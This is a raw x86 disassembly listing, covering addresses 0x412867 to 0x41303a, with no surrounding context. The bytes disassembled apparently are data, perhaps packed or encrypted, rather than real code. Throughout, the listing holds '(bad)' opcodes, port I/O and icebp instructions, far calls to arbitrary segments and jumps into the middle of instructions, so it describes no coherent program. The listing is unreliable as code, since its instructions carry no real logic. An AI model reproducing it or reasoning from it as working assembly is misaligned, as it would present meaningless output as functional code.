  412867:	(bad)  
  412868:	fist   WORD PTR [esi]
  41286a:	sbb    eax,0x9a72cc00
  41286f:	out    0x50,eax
  412871:	jge    0x4128a9
  412873:	outs   dx,DWORD PTR ds:[esi]
  412874:	sub    DWORD PTR [ebp+0x5fad0d10],esi
  41287a:	cdq    
  41287b:	imul   esp,DWORD PTR [ecx-0x6e],0xfffffffb
  41287f:	dec    edi
  412880:	push   cs
  412881:	xchg   ebx,eax
  412882:	add    eax,0x6ed3ec72
  412887:	bound  ebp,QWORD PTR [esi+0x2db7e903]
  41288d:	and    al,0xb8
  41288f:	dec    esp
  412890:	in     eax,0xf7
  412892:	sbb    al,0x70
  412894:	add    BYTE PTR [ecx-0x5579084e],dh
  41289a:	ret    
  41289b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41289c:	jo     0x4128c2
  41289e:	imul   esp,DWORD PTR [eax-0x4bf50e36],0x42
  4128a5:	cdq    
  4128a6:	and    DWORD PTR [esi],ebp
  4128a8:	and    eax,0x48e6b012
  4128ad:	pop    edi
  4128ae:	or     eax,ecx
  4128b0:	mov    ds:0xff2e1a2f,eax
  4128b5:	push   0xefc66ab7
  4128ba:	xchg   esi,eax
  4128bb:	cmp    DWORD PTR [ebp+0x71f1dfa9],ebx
  4128c1:	push   ebp
  4128c2:	xchg   ebx,esp
  4128c4:	jae    0x4128f4
  4128c6:	sbb    eax,0xa1600089
  4128cb:	mov    cl,0x60
  4128cd:	repz mov ah,0xbe
  4128d0:	xchg   ebx,eax
  4128d1:	mov    al,ds:0xd98c8508
  4128d6:	fstp   TBYTE PTR [esi+0x30ef03d1]
  4128dc:	stc    
  4128dd:	pusha  
  4128de:	pushf  
  4128df:	popa   
  4128e0:	mov    bl,0x2c
  4128e2:	jmp    0x4128c9
  4128e4:	push   es
  4128e5:	or     ebp,DWORD PTR [ecx]
  4128e7:	adc    eax,0xd8dd9a0
  4128ec:	sub    al,0x18
  4128ee:	xor    DWORD PTR [edi-0x78],edi
  4128f1:	popf   
  4128f2:	dec    ecx
  4128f3:	popf   
  4128f4:	cmc    
  4128f5:	shl    DWORD PTR [eax+0x36cc5933],1
  4128fb:	sbb    ch,ch
  4128fd:	loopne 0x412916
  4128ff:	sbb    BYTE PTR [edi-0x6f069c30],cl
  412905:	imul   DWORD PTR [eax-0x45da50c]
  41290b:	inc    eax
  41290c:	xchg   esi,eax
  41290d:	pop    esp
  41290e:	push   eax
  41290f:	leave  
  412910:	inc    edi
  412911:	(bad)  
  412912:	loope  0x412922
  412914:	popa   
  412915:	adc    DWORD PTR [esp+edx*8],esp
  412918:	pop    esp
  412919:	neg    BYTE PTR [esi-0x1efd187b]
  41291f:	test   DWORD PTR [edx],eax
  412921:	mov    al,0x91
  412923:	retf   0x21a9
  412926:	mov    bl,0xb3
  412928:	cmc    
  412929:	test   DWORD PTR [esi],edx
  41292b:	mov    ebx,0x100e63b9
  412930:	jnp    0x412983
  412932:	cmp    DWORD PTR [edx-0x20],0x31b4ebc7
  412939:	(bad)  
  41293a:	pop    ecx
  41293b:	mov    cl,BYTE PTR [ebx-0xe33d9d]
  412941:	sar    BYTE PTR [edi+0x3e3ebeaa],1
  412947:	inc    esp
  412948:	sahf   
  412949:	xchg   esi,eax
  41294a:	das    
  41294b:	mov    ch,0x76
  41294d:	jp     0x4128d0
  41294f:	push   0xffffffee
  412951:	dec    ebp
  412952:	mov    ds:0x21bbbe9b,al
  412957:	adc    DWORD PTR [edx-0x7eb57417],ebp
  41295d:	into   
  41295e:	mov    ah,BYTE PTR [edx]
  412960:	js     0x412972
  412962:	push   ebx
  412963:	mov    ebp,0xf611a08d
  412968:	pop    eax
  412969:	mov    bl,0xb7
  41296b:	pushf  
  41296c:	pop    eax
  41296d:	push   ebp
  41296e:	retf   0x1a94
  412971:	out    dx,al
  412972:	push   es
  412973:	adc    dh,ch
  412975:	clc    
  412976:	sub    edi,DWORD PTR gs:[ecx]
  412979:	fnsave [ebx]
  41297b:	and    dl,BYTE PTR [eax+0x36f85bec]
  412981:	imul   edx,DWORD PTR [edi+0x2a],0xda4e3d33
  412988:	(bad)
  41298b:	js     0x412958
  41298d:	loop   0x412929
  41298f:	lock inc ebx
  412991:	sbb    BYTE PTR [edi],bl
  412993:	add    edx,DWORD PTR [eax+0x6e]
  412996:	in     eax,dx
  412997:	pop    ecx
  412998:	mov    ah,0x6a
  41299a:	or     BYTE PTR [ebp+0x2b4ec6b3],0xb
  4129a1:	jmp    0x412963
  4129a3:	inc    ebx
  4129a4:	(bad)  
  4129a5:	into   
  4129a6:	cmp    eax,0xc46e3283
  4129ab:	mov    ds:0x21a9b888,eax
  4129b0:	jns    0x412951
  4129b2:	in     al,dx
  4129b3:	mov    WORD PTR [ebp-0x45],es
  4129b6:	repnz fmul DWORD PTR [ecx-0x3e989a6c]
  4129bd:	sbb    eax,0x1b4705f0
  4129c2:	repz aas 
  4129c4:	ds push ecx
  4129c6:	sbb    edx,ebp
  4129c8:	pop    edx
  4129c9:	lods   eax,DWORD PTR ds:[esi]
  4129ca:	and    eax,0x642767c7
  4129cf:	jmp    0x4129b8
  4129d1:	push   edi
  4129d2:	mov    WORD PTR [edx],?
  4129d4:	and    al,BYTE PTR [edi-0x59]
  4129d7:	inc    ecx
  4129d8:	xlat   BYTE PTR ds:[ebx]
  4129d9:	ja     0x412a00
  4129db:	add    BYTE PTR [ebx+0x1e],ah
  4129de:	xor    DWORD PTR [esi+ebx*8-0x49],esi
  4129e2:	mov    dl,dl
  4129e4:	dec    ecx
  4129e5:	repnz push ds
  4129e7:	sub    ebp,DWORD PTR [ebx+ecx*4-0x8]
  4129eb:	jmp    0xd8f93d94
  4129f0:	add    BYTE PTR [ebp+esi*4+0x3e],cl
  4129f4:	dec    eax
  4129f5:	xchg   ebp,eax
  4129f6:	mov    al,0xe5
  4129f8:	mov    ecx,0x149bfe59
  4129fd:	mov    al,ds:0x7639ca92
  412a02:	jge    0x4129cd
  412a04:	in     ax,0x25
  412a07:	aaa    
  412a08:	inc    edx
  412a09:	inc    esp
  412a0a:	xchg   ebp,eax
  412a0b:	pop    ss
  412a0c:	fs pusha 
  412a0e:	in     eax,0xa8
  412a10:	shl    esp,1
  412a12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a13:	sahf   
  412a14:	inc    edi
  412a15:	ror    DWORD PTR [ebx+0x7c8142cc],0x10
  412a1c:	test   BYTE PTR [edx-0x15e10bfb],bl
  412a22:	jmp    0x4129eb
  412a24:	les    esi,FWORD PTR [edi]
  412a26:	fs loope 0x412a2b
  412a29:	jl     0x4129d5
  412a2b:	or     eax,0x191b7537
  412a30:	and    BYTE PTR [esi+ebx*4-0x6fbe7ed6],bl
  412a37:	mov    eax,0xda367368
  412a3c:	stc    
  412a3d:	(bad)  
  412a3e:	sbb    ebx,DWORD PTR [esi+0x561af33e]
  412a44:	mov    ds:0x8d39a2df,eax
  412a49:	jo     0x412a6e
  412a4b:	sub    esi,ebx
  412a4d:	in     al,dx
  412a4e:	add    BYTE PTR [ebp+0x262ad687],dl
  412a54:	mov    eax,0x8ca5538f
  412a59:	stos   DWORD PTR es:[edi],eax
  412a5a:	jbe    0x412ad9
  412a5c:	jbe    0x412a95
  412a5e:	jne    0x412a39
  412a60:	aas    
  412a61:	xchg   esi,eax
  412a62:	fisubr WORD PTR [esi+0x4c]
  412a65:	ins    DWORD PTR es:[edi],dx
  412a66:	test   BYTE PTR [edi+0x45bbed5c],cl
  412a6c:	push   esp
  412a6d:	pop    DWORD PTR [ebx-0x49ef3d67]
  412a73:	cmp    bh,BYTE PTR ds:0x2bdda5a2
  412a79:	pop    ebp
  412a7a:	sub    DWORD PTR [edx+0x7256fa60],edi
  412a80:	es out 0xcf,al
  412a83:	scas   al,BYTE PTR es:[edi]
  412a84:	out    dx,al
  412a85:	fidivr DWORD PTR [eax-0x11]
  412a88:	retf   
  412a89:	inc    edx
  412a8a:	xlat   BYTE PTR ds:[ebx]
  412a8b:	je     0x412a98
  412a8d:	cwde   
  412a8e:	adc    al,0x52
  412a90:	loopne 0x412a60
  412a92:	mov    esi,0x1c7957b3
  412a97:	sub    al,0x7b
  412a99:	imul   esp,DWORD PTR [ebx-0x4a54e4d2],0x4c
  412aa0:	xchg   edx,eax
  412aa1:	jnp    0x412ad6
  412aa3:	scas   eax,DWORD PTR es:[edi]
  412aa4:	loope  0x412b1e
  412aa6:	pop    edx
  412aa7:	xlat   BYTE PTR ds:[ebx]
  412aa8:	mov    bl,0x7f
  412aaa:	pop    edx
  412aab:	cmp    eax,0xd624769a
  412ab0:	mov    cl,0xe5
  412ab2:	std    
  412ab3:	iret   
  412ab4:	gs pop esi
  412ab6:	pop    edx
  412ab7:	(bad)  
  412ab8:	xchg   ecx,eax
  412ab9:	aas    
  412aba:	leave  
  412abb:	inc    ebx
  412abc:	pop    edx
  412abd:	sbb    DWORD PTR ds:0x257245,edi
  412ac3:	sbb    eax,0x2a1633ea
  412ac8:	mov    eax,0xf08887b7
  412acd:	(bad)  
  412ace:	push   cs
  412acf:	int    0x47
  412ad1:	enter  0xaf80,0xdb
  412ad5:	gs pop es
  412ad7:	push   DWORD PTR [edx+0x43032168]
  412add:	loope  0x412aa7
  412adf:	unpcklps xmm6,XMMWORD PTR [edx]
  412ae2:	arpl   WORD PTR [ecx-0x80],sp
  412ae5:	sub    DWORD PTR [ecx+0x31],edx
  412ae8:	push   0x52
  412aea:	cmc    
  412aeb:	jmp    FWORD PTR [edi+edi*8-0x43]
  412aef:	pop    ebx
  412af0:	push   edx
  412af1:	rcl    BYTE PTR [edi],cl
  412af3:	test   al,0xf4
  412af5:	fs nop
  412af7:	and    ebp,DWORD PTR [edx]
  412af9:	and    ebp,DWORD PTR [ebx-0x4da9b41]
  412aff:	gs mov edx,0x1372d4d6
  412b05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b06:	and    bh,dl
  412b08:	push   edi
  412b09:	jle    0x412b20
  412b0b:	fisttp QWORD PTR [edx]
  412b0d:	ret    0xa2fd
  412b10:	sub    eax,0xf2336407
  412b15:	loopne 0x412aeb
  412b17:	adc    ebp,ebx
  412b19:	rol    DWORD PTR [ebp+ecx*2+0x59acfb88],1
  412b20:	std    
  412b21:	sub    al,0x96
  412b23:	lds    edx,FWORD PTR [ecx+0x4]
  412b26:	jnp    0x412ae1
  412b28:	inc    edi
  412b29:	(bad)  [eax+0x39fef47b]
  412b2f:	stos   DWORD PTR es:[edi],eax
  412b30:	test   al,0xea
  412b32:	adc    DWORD PTR [edx-0x3a175673],ebp
  412b38:	cdq    
  412b39:	inc    edx
  412b3a:	xor    bl,BYTE PTR [ebx-0x6a]
  412b3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b3e:	adc    dl,bh
  412b40:	outs   dx,BYTE PTR ds:[esi]
  412b41:	shl    DWORD PTR [ecx],0x7
  412b44:	lea    edi,[ebp+0x59ee0bec]
  412b4a:	sahf   
  412b4b:	ds icebp 
  412b4d:	jmp    DWORD PTR [eax+0x1d7144e]
  412b53:	das    
  412b54:	sbb    al,0xa3
  412b56:	pusha  
  412b57:	lahf   
  412b58:	pop    ss
  412b59:	push   ss
  412b5a:	push   edx
  412b5b:	iret   
  412b5c:	dec    esi
  412b5d:	pop    ds
  412b5e:	inc    DWORD PTR [esi+eiz*1+0x55afa98f]
  412b65:	add    al,0x9e
  412b67:	mov    bh,0xf3
  412b69:	mov    ch,0x23
  412b6b:	sbb    ah,BYTE PTR [edx+0xa]
  412b6e:	cmc    
  412b6f:	mov    dh,0x67
  412b71:	rcl    DWORD PTR [edx+0x25b5b692],cl
  412b77:	jae    0x412ba6
  412b79:	mov    ds:0x5ee11304,al
  412b7e:	jns    0x412be2
  412b80:	cdq    
  412b81:	lahf   
  412b82:	jecxz  0x412b0c
  412b84:	inc    ebx
  412b85:	cdq    
  412b86:	icebp  
  412b87:	frstor [edx]
  412b89:	cmp    al,0x88
  412b8b:	adc    ecx,esi
  412b8d:	xchg   edi,eax
  412b8e:	mov    ebx,0x4a96cafa
  412b93:	sub    cx,WORD PTR [edx-0x5d70a8b7]
  412b9a:	enter  0xded6,0x98
  412b9e:	xchg   DWORD PTR [ebx+0x19],ecx
  412ba1:	push   edx
  412ba2:	mov    dl,0xd6
  412ba4:	adc    eax,0x3a221efc
  412ba9:	je     0x412bdc
  412bab:	icebp  
  412bac:	mov    eax,0x52766fae
  412bb1:	xchg   edx,eax
  412bb2:	pop    edi
  412bb3:	cdq    
  412bb4:	cmp    ebx,DWORD PTR [eax]
  412bb6:	xchg   DWORD PTR [ebx],ecx
  412bb8:	mov    bl,0xe5
  412bba:	mov    ch,0x2a
  412bbc:	push   edi
  412bbd:	mov    ds,ebx
  412bbf:	(bad)  
  412bc1:	push   0xffffffcb
  412bc3:	test   BYTE PTR [ebp-0x31],dh
  412bc6:	scas   al,BYTE PTR es:[edi]
  412bc7:	lods   al,BYTE PTR ds:[esi]
  412bc8:	jo     0x412c09
  412bca:	pop    esi
  412bcb:	xor    al,0x45
  412bcd:	jg     0x412c24
  412bcf:	lods   al,BYTE PTR ds:[esi]
  412bd0:	sbb    edx,0xffffff8a
  412bd3:	push   edi
  412bd4:	xchg   edx,eax
  412bd5:	retf   0xf196
  412bd8:	es inc ebp
  412bda:	shl    BYTE PTR [ecx],0x4f
  412bdd:	stos   BYTE PTR es:[edi],al
  412bde:	loope  0x412c2b
  412be0:	mul    DWORD PTR [eax]
  412be2:	inc    edi
  412be3:	or     eax,0xa0e73acc
  412be8:	pushf  
  412be9:	push   esi
  412bea:	mov    esi,0x2ea6e553
  412bef:	pushf  
  412bf0:	xchg   edx,eax
  412bf1:	inc    eax
  412bf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bf3:	ficom  DWORD PTR [edi-0x3e]
  412bf7:	loop   0x412c6f
  412bf9:	sub    ebp,DWORD PTR ds:0x74a2ad5
  412bff:	sub    eax,0xbbd37374
  412c04:	dec    eax
  412c05:	cmp    eax,0x79eb682e
  412c0a:	xor    bl,BYTE PTR [edx+0x4bf42e5f]
  412c10:	stos   DWORD PTR es:[edi],eax
  412c11:	js     0x412c45
  412c13:	push   ebp
  412c14:	jbe    0x412c46
  412c16:	sub    BYTE PTR [edi-0x12c4b44],bl
  412c1c:	xchg   ecx,eax
  412c1d:	test   eax,0x8fcda53f
  412c22:	push   es
  412c23:	scas   al,BYTE PTR es:[edi]
  412c24:	sub    eax,0x94b0db53
  412c29:	mov    eax,ds:0xc6ce2b73
  412c2e:	aad    0xd1
  412c30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c31:	int    0x3a
  412c33:	add    eax,0x267f92e6
  412c38:	dec    ecx
  412c39:	xlat   BYTE PTR ds:[ebx]
  412c3a:	xchg   BYTE PTR [ebx+0x45a644b2],ch
  412c40:	enter  0xb511,0x1d
  412c44:	ds int 0xb1
  412c47:	sub    dh,dl
  412c49:	js     0x412c1e
  412c4b:	pop    esp
  412c4c:	xor    esp,ebx
  412c4e:	pushf  
  412c4f:	mov    ds:0x7c21d9ad,al
  412c54:	pushf  
  412c55:	and    eax,DWORD PTR [edi+ecx*2]
  412c58:	scas   eax,DWORD PTR es:[edi]
  412c59:	repnz lea esi,[edx]
  412c5c:	xor    al,0x60
  412c5e:	xchg   esp,eax
  412c5f:	mov    dl,0xb0
  412c61:	jb     0x412c57
  412c63:	sub    esp,DWORD PTR ds:0xe115eef2
  412c69:	inc    esi
  412c6a:	sub    BYTE PTR [edx-0x76],bl
  412c6d:	push   ebx
  412c6e:	or     al,0xe9
  412c70:	dec    edi
  412c71:	jbe    0x412ccb
  412c73:	mov    ebx,0x9f9203e6
  412c78:	adc    BYTE PTR [ebp+esi*1-0x30],ah
  412c7c:	pop    esp
  412c7d:	xchg   BYTE PTR ds:0x124df2ba,al
  412c83:	cld    
  412c84:	xchg   esp,eax
  412c85:	mov    cl,0x81
  412c87:	fimul  WORD PTR [ebp+0x16d060bc]
  412c8d:	xchg   BYTE PTR [ecx-0x5be961ef],ch
  412c93:	fbstp  TBYTE PTR [esi]
  412c95:	ficom  WORD PTR [ecx+esi*4-0x386b6820]
  412c9c:	arpl   WORD PTR [eax+0x57753b98],di
  412ca2:	cs jns 0x412cbc
  412ca5:	imul   edi,DWORD PTR ds:0xdb1104c7,0xffffffc3
  412cac:	loope  0x412cb7
  412cae:	add    eax,ebp
  412cb0:	adc    DWORD PTR [ecx+0xee4d572],0x13a5eaf
  412cba:	out    0x17,eax
  412cbc:	jp     0x412d0c
  412cbe:	test   al,0xc3
  412cc0:	push   ds
  412cc1:	dec    esp
  412cc2:	into   
  412cc3:	in     al,0xa1
  412cc5:	xchg   esi,eax
  412cc6:	xchg   edx,eax
  412cc7:	ret    
  412cc8:	sub    al,0x87
  412cca:	cld    
  412ccb:	sbb    al,0x69
  412ccd:	call   0xe1a3a161
  412cd2:	sub    al,0x17
  412cd4:	in     eax,dx
  412cd5:	jnp    0x412c57
  412cd7:	test   DWORD PTR [esi],esi
  412cd9:	push   0xa7e18897
  412cde:	sahf   
  412cdf:	and    BYTE PTR [ecx],bl
  412ce1:	lahf   
  412ce2:	jecxz  0x412cf5
  412ce4:	dec    BYTE PTR [ebp+0x663486f2]
  412cea:	into   
  412ceb:	sbb    al,al
  412ced:	mov    ecx,0x5aec60a
  412cf2:	mov    dl,0x3
  412cf4:	cmp    BYTE PTR ds:0xb38a10bd,bl
  412cfa:	jno    0x412cfd
  412cfc:	xchg   edx,eax
  412cfd:	mov    dh,0xd8
  412cff:	ins    DWORD PTR es:[edi],dx
  412d00:	push   esi
  412d01:	ss mov ebx,0x923728ab
  412d07:	daa    
  412d08:	inc    eax
  412d09:	test   dh,0x63
  412d0c:	mov    ah,dl
  412d0e:	scas   al,BYTE PTR es:[edi]
  412d0f:	xor    bh,BYTE PTR [ebx-0x77]
  412d12:	jbe    0x412ce8
  412d14:	push   edx
  412d15:	(bad)  
  412d16:	jp     0x412d40
  412d18:	mov    esi,0x37152ade
  412d1d:	dec    ebp
  412d1e:	mov    ebp,0x89f7f4a6
  412d23:	imul   esp,DWORD PTR [edi],0x18
  412d26:	push   edi
  412d27:	mov    al,0xb4
  412d29:	jne    0x412cf4
  412d2b:	or     BYTE PTR [esp+eax*2],cl
  412d2e:	mov    cl,0xb8
  412d30:	dec    bx
  412d32:	jmp    FWORD PTR [esi-0x1e044db6]
  412d38:	dec    esi
  412d39:	cwde   
  412d3a:	and    eax,DWORD PTR [ebp+0x4c4cb791]
  412d40:	dec    esi
  412d41:	push   ss
  412d42:	pop    ebp
  412d43:	dec    ebp
  412d44:	mov    cl,0xa9
  412d46:	pop    ecx
  412d47:	pop    ebx
  412d48:	and    eax,0x4154078
  412d4d:	adc    eax,0x12f9877b
  412d52:	or     BYTE PTR [edx-0x35],dl
  412d55:	ficomp WORD PTR [eax+0x43745143]
  412d5b:	imul   esi,DWORD PTR [esi+0x868b423],0xffffff91
  412d62:	sub    edx,DWORD PTR [edx-0x1bee9340]
  412d68:	pop    edi
  412d69:	retf   0x55e1
  412d6c:	ds fucom st(4)
  412d6f:	std    
  412d70:	pop    ebp
  412d71:	adc    cl,0x4b
  412d74:	mov    BYTE PTR [edi+ebx*2+0x49],ch
  412d78:	scas   al,BYTE PTR es:[edi]
  412d79:	push   ecx
  412d7a:	add    DWORD PTR [ebx+0x2e3b7c15],0xb
  412d81:	adc    BYTE PTR [edi-0x3da353a4],dl
  412d87:	or     DWORD PTR [eax],eax
  412d89:	ja     0x412d29
  412d8b:	cmc    
  412d8c:	push   esi
  412d8d:	and    ch,BYTE PTR [edx-0x47bfab0e]
  412d93:	dec    esi
  412d94:	fild   WORD PTR [ebp-0x1cd1292d]
  412d9a:	sub    ah,BYTE PTR [ebp-0x6f]
  412d9d:	test   BYTE PTR [eax-0x7858cccc],dh
  412da3:	fwait
  412da4:	push   0xb
  412da6:	cmp    bh,BYTE PTR [esi-0x6b]
  412da9:	fisubr WORD PTR [esi+0x3b2a1e6f]
  412daf:	fpatan 
  412db1:	mov    bh,dl
  412db3:	iret   
  412db4:	(bad)  
  412db6:	rcl    BYTE PTR [eax+0x3a],0x54
  412dba:	jb     0x412d5e
  412dbc:	aam    0x4c
  412dbe:	or     eax,DWORD PTR [ebx-0x67cdb962]
  412dc4:	xchg   ebp,eax
  412dc5:	sub    DWORD PTR [edx+0x36a129f4],esp
  412dcb:	mov    esp,0xfd273273
  412dd0:	push   ebx
  412dd1:	push   es
  412dd2:	pop    es
  412dd3:	ficom  WORD PTR [eax+0x1455d1e6]
  412dd9:	push   ss
  412dda:	cld    
  412ddb:	ret    0xc87d
  412dde:	push   ds
  412ddf:	adc    DWORD PTR [ebx-0x57],0x5f757b89
  412de6:	cwde   
  412de7:	iret   
  412de8:	jnp    0x412d83
  412dea:	out    0xc0,al
  412dec:	jne    0x412de8
  412dee:	mov    ah,0xf0
  412df0:	pop    esp
  412df1:	lahf   
  412df2:	and    DWORD PTR [ecx],ecx
  412df4:	push   esi
  412df5:	into   
  412df6:	call   0x3b133501
  412dfb:	jecxz  0x412e08
  412dfd:	fistp  QWORD PTR [edi-0x31db20f5]
  412e03:	sub    ecx,DWORD PTR [ecx]
  412e05:	in     eax,0x75
  412e07:	shl    BYTE PTR [eax-0x5d77eada],cl
  412e0d:	mov    DWORD PTR [edi+ecx*4],ecx
  412e10:	sub    esi,eax
  412e12:	cmp    eax,0x3eef867a
  412e17:	inc    ebp
  412e18:	xor    al,0xd2
  412e1a:	sub    al,0xca
  412e1c:	das    
  412e1d:	int    0xbf
  412e1f:	cli    
  412e20:	adc    al,0x3a
  412e22:	sub    DWORD PTR [edi-0x68],ebx
  412e25:	fstp   DWORD PTR [edi+ebp*4]
  412e28:	xchg   edx,eax
  412e29:	push   esi
  412e2a:	scas   eax,DWORD PTR es:[edi]
  412e2b:	or     cl,ch
  412e2d:	jle    0x412e41
  412e2f:	addr16 gs mov bl,0x4d
  412e33:	mov    ecx,0xac936947
  412e38:	jno    0x412eb6
  412e3a:	js     0x412ea8
  412e3c:	mov    cl,0x69
  412e3e:	arpl   WORD PTR [ebp+0x64bdabbf],si
  412e44:	lock fwait
  412e46:	imul   eax,edx,0x81affd16
  412e4c:	inc    esi
  412e4d:	movzx  ecx,sp
  412e50:	pop    es
  412e51:	jnp    0x412e02
  412e53:	dec    ebp
  412e54:	pop    edi
  412e55:	cs icebp 
  412e57:	clc    
  412e58:	mov    esp,0x69d00373
  412e5d:	sar    DWORD PTR ds:0x640136cd,0xf9
  412e64:	inc    ebp
  412e65:	adc    ch,bh
  412e67:	inc    edx
  412e68:	push   es
  412e69:	cli    
  412e6a:	xchg   edx,eax
  412e6b:	les    esi,FWORD PTR [eax+ebp*2+0x63]
  412e6f:	dec    esi
  412e70:	inc    esi
  412e71:	push   cs
  412e72:	js     0x412e68
  412e74:	add    cl,BYTE PTR [esi-0x59]
  412e77:	fwait
  412e78:	mov    ebx,0x49d45ab5
  412e7d:	je     0x412e15
  412e7f:	shl    DWORD PTR [eax],0xc1
  412e82:	fsubr  st(4),st
  412e84:	dec    edx
  412e85:	iret   
  412e86:	iret   
  412e87:	push   ebp
  412e88:	inc    edi
  412e89:	fisttp QWORD PTR [edx]
  412e8b:	mov    eax,0x47c23120
  412e90:	adc    ecx,eax
  412e92:	adc    bl,BYTE PTR [edx+eax*8-0x3960ffec]
  412e99:	mov    esi,DWORD PTR [ecx+0x8]
  412e9c:	jbe    0x412e24
  412e9e:	out    dx,al
  412e9f:	retf   
  412ea0:	mov    ch,0xa8
  412ea2:	icebp  
  412ea3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ea4:	jo     0x412efd
  412ea6:	and    BYTE PTR [ebp+0xeef6f5d],bl
  412eac:	cmp    al,0xbc
  412eae:	add    eax,0xd09b54b1
  412eb3:	sbb    edi,edi
  412eb5:	ds xchg ebp,eax
  412eb7:	sbb    dh,BYTE PTR [ecx+0x3e]
  412eba:	jg     0x412e96
  412ebc:	dec    ebp
  412ebd:	cmp    al,BYTE PTR [ecx-0x39a24a45]
  412ec3:	pusha  
  412ec4:	fsubr  QWORD PTR [ecx-0x6a]
  412ec7:	ins    BYTE PTR es:[edi],dx
  412ec8:	mov    BYTE PTR [esi],0x67
  412ecb:	into   
  412ecc:	data16 jne 0x412e76
  412ecf:	xor    esp,eax
  412ed1:	mov    eax,0x6765c25a
  412ed6:	and    al,0x15
  412ed8:	test   eax,0xa9edef9f
  412edd:	dec    esi
  412ede:	pop    ds
  412edf:	shl    BYTE PTR [ebp+0x222886d0],cl
  412ee5:	push   ds
  412ee6:	je     0x412e72
  412ee8:	pushf  
  412ee9:	push   es
  412eea:	fs fcmovbe st,st(0)
  412eed:	sbb    dh,ch
  412eef:	adc    ah,BYTE PTR [edx+0x6d012376]
  412ef5:	sub    BYTE PTR [eax-0x189e3c09],0x60
  412efc:	push   eax
  412efd:	dec    edi
  412efe:	inc    esp
  412eff:	cmc    
  412f00:	stos   DWORD PTR es:[edi],eax
  412f01:	pop    es
  412f02:	add    bh,BYTE PTR [eax]
  412f04:	mov    bl,0x17
  412f06:	dec    dx
  412f08:	test   DWORD PTR [edi],0xced1f618
  412f0e:	xchg   edi,eax
  412f0f:	test   DWORD PTR [eax+0x4e8734bb],0x8f92c980
  412f19:	jbe    0x412f89
  412f1b:	lds    ebx,FWORD PTR [ecx]
  412f1d:	or     ecx,DWORD PTR [ebx]
  412f1f:	inc    ebx
  412f20:	dec    eax
  412f21:	jno    0x412f48
  412f23:	jmp    0x412f06
  412f25:	sbb    BYTE PTR [ebx-0x4],0x6a
  412f29:	mov    esi,0xf936e30e
  412f2e:	mov    cl,0xbe
  412f30:	jmp    0xdfddbdb3
  412f35:	mov    ecx,0x829ffd11
  412f3a:	addr16 jl 0x412f2a
  412f3d:	pop    ebp
  412f3e:	mov    ebp,eax
  412f40:	sub    BYTE PTR [ebx+edi*4-0x340a274d],dl
  412f47:	inc    ebx
  412f48:	pop    ss
  412f49:	repz adc eax,0xe4385bf5
  412f4f:	ja     0x412f31
  412f51:	popf   
  412f52:	push   ebp
  412f53:	pop    ebx
  412f54:	cmp    BYTE PTR [esi],bl
  412f56:	xchg   DWORD PTR [eax-0x4b],eax
  412f59:	mov    edi,0xa4aeb115
  412f5e:	call   0x1056:0x82aa11ba
  412f65:	jl     0x412f61
  412f67:	xchg   ebp,eax
  412f68:	fiadd  WORD PTR [ebx+edi*1+0x34]
  412f6c:	push   ss
  412f6d:	sub    ebx,DWORD PTR [eax+0x53e3744b]
  412f73:	lods   al,BYTE PTR ds:[esi]
  412f74:	call   0x5d4d:0x48b2e5fc
  412f7b:	mov    ch,ah
  412f7d:	jge    0x412ffc
  412f7f:	pop    esp
  412f80:	inc    ebx
  412f81:	mov    edi,0x6dee396d
  412f86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f87:	dec    edx
  412f88:	jo     0x413007
  412f8a:	rcl    ebp,1
  412f8c:	ja     0x412ff9
  412f8e:	lods   al,BYTE PTR ds:[esi]
  412f8f:	mov    edx,0x4d8f249
  412f94:	add    al,0xd3
  412f96:	out    0x44,eax
  412f98:	jmp    0x9cdd3eec
  412f9d:	retf   0x7d4
  412fa0:	out    dx,al
  412fa1:	out    dx,al
  412fa2:	mov    ebx,0xeab4dc1e
  412fa7:	jne    0x41300d
  412fa9:	xchg   edi,eax
  412faa:	mov    bl,0x27
  412fac:	xchg   DWORD PTR [eax+0x56ac931f],ebp
  412fb2:	cmp    dh,al
  412fb4:	inc    esi
  412fb5:	mov    BYTE PTR ds:0x7267dcda,cl
  412fbb:	stos   DWORD PTR es:[edi],eax
  412fbc:	out    dx,eax
  412fbd:	pop    esi
  412fbe:	es pop edx
  412fc0:	sbb    ecx,edi
  412fc2:	mov    bh,0x6e
  412fc4:	lods   al,BYTE PTR ds:[esi]
  412fc5:	push   0x9
  412fc7:	in     al,dx
  412fc8:	pop    esp
  412fc9:	mov    ah,0x50
  412fcb:	cmc    
  412fcc:	adc    edi,ebx
  412fce:	cmp    BYTE PTR [edx+0xd8db1a8],dh
  412fd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fd5:	ret    
  412fd6:	jbe    0x413015
  412fd8:	stos   BYTE PTR es:[edi],al
  412fd9:	into   
  412fda:	mov    bl,0xa0
  412fdc:	cmp    al,0x87
  412fde:	js     0x413036
  412fe0:	xchg   DWORD PTR [esi],ebp
  412fe2:	retf   0x875c
  412fe5:	mov    dh,0x91
  412fe7:	hlt    
  412fe8:	fcom   QWORD PTR [ebp-0x7520764e]
  412fee:	adc    DWORD PTR [ecx+0x13],ecx
  412ff1:	adc    bl,dh
  412ff3:	sar    BYTE PTR [ebx+0x7c430632],cl
  412ff9:	dec    ebp
  412ffa:	loop   0x41303d
  412ffc:	jbe    0x413029
  412ffe:	xor    bl,0x29
  413001:	in     al,0x79
  413003:	push   0xffffff96
  413005:	pop    esp
  413006:	sub    DWORD PTR [esi+0x595afee1],edx
  41300c:	mov    ecx,0xb827bc7a
  413011:	out    dx,eax
  413012:	or     al,0xea
  413014:	xchg   ebp,eax
  413015:	or     dl,dh
  413017:	cmp    eax,0x812b3dfe
  41301c:	sbb    al,0xe3
  41301e:	pop    es
  41301f:	addr16 push cs
  413021:	cmp    DWORD PTR [esi+0x190f0eb0],0x26
  413028:	int3   
  413029:	jnp    0x413035
  41302b:	sbb    eax,0x6bfd42ba
  413030:	inc    edx
  413031:	jle    0x413007
  413033:	ds xchg edi,eax
  413035:	pop    eax
  413036:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413037:	retf   0x4413
  41303a:	inc    esp
